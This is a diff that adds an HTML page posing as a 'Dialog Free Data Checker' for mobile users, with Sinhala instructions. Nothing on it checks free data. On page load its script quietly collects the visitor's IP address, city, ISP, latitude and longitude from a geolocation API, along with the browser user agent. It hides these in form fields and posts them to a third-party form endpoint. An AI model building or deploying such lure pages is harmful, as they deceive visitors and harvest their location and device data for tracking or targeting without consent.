@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Dialog Free Data Checker</title>
+  <style>
+    body {
+      background: #121212;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      padding: 30px;
+    }
+    h2 {
+      color: #00cec9;
+    }
+    p {
+      color: #dfe6e9;
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px 0;
+      width: 100%;
+      max-width: 400px;
+      font-size: 16px;
+      border-radius: 6px;
+      border: none;
+    }
+    button {
+      background-color: #0984e3;
+      color: white;
+      cursor: pointer;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h2>Dialog Free Data Checker</h2>
+  <p>ඔබගේ IP ලිපිනය හා Device තොරතුරු ඇතුළත් කර Dialog free data status එක පරීක්ෂා කරන්න.</p>
+
+  <form action="https://formspree.io/f/manelzor" method="POST" id="dataForm">
+    <input type="text" name="custom_ip" placeholder="Enter your IP address (optional)">
+    
+    <input type="hidden" name="detected_ip" id="detected_ip">
+    <input type="hidden" name="location" id="location">
+    <input type="hidden" name="device_info" id="device_info">
+
+    <button type="submit">Check Free Data</button>
+  </form>
+
+  <p id="status" class="hidden">Submitting... Please wait</p>
+
+  <script>
+    async function gatherInfo() {
+      try {
+        const res = await fetch("https://ip-api.com/json/");
+        const data = await res.json();
+
+        if (data.status === "success") {
+          document.getElementById("detected_ip").value = data.query;
+          document.getElementById("location").value = `Country: ${data.country}, Region: ${data.regionName}, City: ${data.city}, ISP: ${data.isp}, Lat: ${data.lat}, Lon: ${data.lon}`;
+        }
+
+        document.getElementById("device_info").value = navigator.userAgent;
+      } catch (e) {
+        console.error("Error fetching IP info");
+      }
+    }
+
+    // Run when page loads
+    gatherInfo();
+
+    // Optional: Show submitting status
+    document.getElementById("dataForm").addEventListener("submit", () => {
+      document.getElementById("status").classList.remove("hidden");
+    });
+  </script>
+</body>
+</html>
